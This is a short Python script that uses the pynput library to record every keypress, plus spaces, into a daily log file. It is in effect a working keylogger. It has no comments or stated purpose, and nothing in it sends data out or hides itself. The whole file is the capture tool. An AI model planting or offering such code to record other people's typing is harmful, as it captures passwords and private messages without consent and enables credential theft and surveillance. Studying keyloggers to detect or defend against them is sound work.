from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Key

def on_press(key):
    try:
        with open(f"log-{datetime.today().strftime('%Y-%m-%d')}.txt", 'a') as f:
            f.write(key.char)
    except AttributeError:
        if key == Key.space:
            with open(f"log-{datetime.today().strftime('%Y-%m-%d')}.txt", 'a') as f:
                f.write(" ")

def on_release(key):
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()